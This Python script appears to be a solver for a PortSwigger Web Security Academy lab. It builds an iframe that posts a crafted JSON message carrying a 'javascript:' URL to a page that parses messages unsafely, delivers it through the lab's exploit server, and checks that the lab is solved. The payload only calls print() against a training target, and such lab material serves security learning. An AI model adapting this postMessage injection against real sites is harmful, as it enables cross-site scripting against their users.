import requests
from urllib3.exceptions import InsecureRequestWarning
from time import sleep
from bs4 import BeautifulSoup
import html

requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

# lab_url: https://portswigger.net/web-security/dom-based/controlling-the-web-message-source/lab-dom-xss-using-web-messages-and-json-parse
# author: 0xyf


class DOMBased3:
    def __init__(self):
        self.lab_id = "0afa0097048ba664bd2175c4006500d2"
        self.proxies = {"https": "http://127.0.0.1:8080"}

        self.url = f"https://{self.lab_id}.web-security-academy.net"

    def get_exploit_srv_url(self):
        r = requests.get(self.url)
        soup = BeautifulSoup(r.text, "html.parser")
        self.exploit_srv_url = soup.find("a", id="exploit-link").get("href")

    def execute_request(self, data):
        r = requests.post(
            f"{self.exploit_srv_url}",
            data=data,
            proxies=self.proxies,
            verify=False,
        )
        return r

    def dom(self):
        self.get_exploit_srv_url()
        xss_payload = '{"type":"load-channel", "url":"javascript:print()"}'
        xss_payload = html.escape(xss_payload)
        payload = f"""<iframe src='{self.url}' onload="this.contentWindow.postMessage('{xss_payload}', '*')">"""

        print(f"[+] payload: {payload}")
        data = {
            "urlIsHttps": "on",
            "responseFile": "/exploit",
            "responseHead": f"HTTP/1.1 200 OK\r\nContent-Type: text/html; charset=utf-8",
            "formAction": "DELIVER_TO_VICTIM",
            "responseBody": payload,
        }
        r = self.execute_request(data)

    def dom_alternative(self):
        self.get_exploit_srv_url()
        xss_payload = (
            """{\\"type\\":\\"load-channel\\",\\"url\\":\\"javascript:print()\\"}"""
        )
        payload = f"""<iframe src='{self.url}' onload='this.contentWindow.postMessage("{xss_payload}", "*")'>"""

        print(f"[+] payload: {payload}")
        data = {
            "urlIsHttps": "on",
            "responseFile": "/exploit",
            "responseHead": f"HTTP/1.1 200 OK\r\nContent-Type: text/html; charset=utf-8",
            "formAction": "DELIVER_TO_VICTIM",
            "responseBody": payload,
        }
        r = self.execute_request(data)

    def check_solved(self):
        sleep(5)
        r = requests.get(self.url)
        if "Congratulations, you solved the lab!" in r.text:
            print("Lab Solved")
        else:
            print("Did not solve lab, check payload")

    def solve(self):
        self.dom_alternative()
        self.check_solved()


def main():
    DOMBased3().solve()


if __name__ == "__main__":
    main()
